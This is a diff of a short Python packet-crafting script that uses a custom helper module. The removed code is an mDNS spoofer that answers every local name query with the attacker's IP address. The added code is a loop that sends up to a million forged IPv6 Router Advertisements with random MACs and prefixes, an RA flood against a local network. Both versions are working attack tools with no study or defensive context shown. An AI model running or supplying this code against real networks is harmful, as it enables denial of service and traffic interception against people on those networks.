@@ -1,41 +1,9 @@
 from All import *
 
-myIpv4 = "192.168.1.47"
+for i in range(1, 1000000):
+    srcmac = randomMac()
+    psrc = randomIpv6(isLocal=True)
+    prefix = randomIpv6(isPrefix=True)
 
-def ismatch_mdns(pkt: Ether):
-    return UDP in pkt and 5353 in (pkt[UDP].sport, pkt[UDP].dport) and DNSQR in pkt
-
-def onmatch_mdns(pkt: Ether):
-    """
-    Receives a mDNS packet and reply with a spoofed packet saying
-    that myIpv4 is the IP of that mDNS domain name.
-    :param pkt: Ether
-    :return: None
-    """
-    isIPv6 = IPv6 in pkt
-
-    if isIPv6:
-        psrc = pkt[IPv6].psrc
-    else:
-        psrc = pkt[IP].psrc
-    sport = pkt[UDP].sport
-    dport = pkt[UDP].dport
-    name = pkt[DNSQR][0].qname
-
-    print(f"Spoofing response for: {name} from ip: {psrc} -> {myIpv4}")
-
-    eth = Ether(dst=pkt.src)
-    udp = UDP(sport=dport, dport=sport)
-    dns = DNS(id=pkt[DNS].id, aa=1, an=DNSRR(name=name, ttl=120, rdata=myIpv4))
-
-    # Windows sends both IPv4 and IPv6 packets (with the same DNSQR), so we
-    # need to check if the packet is IPv6 or IPv4 and send the correct packet.
-
-    if isIPv6:
-        spoofed_response = eth/IPv6(pdst=psrc)/udp/dns
-    else:
-        spoofed_response = eth/IP(pdst=psrc)/udp/dns
-
-    send(spoofed_response)
-
-sniff(ismatch_mdns, onmatch_mdns)
+    pkt = Ether(src=srcmac, dst="33:33:00:00:00:01")/IPv6(psrc=psrc, pdst="ff02::1:ff6f:f67a", hoplimit=255)/NDPRouterAdv(srcmac, prefix)
+    send(pkt)
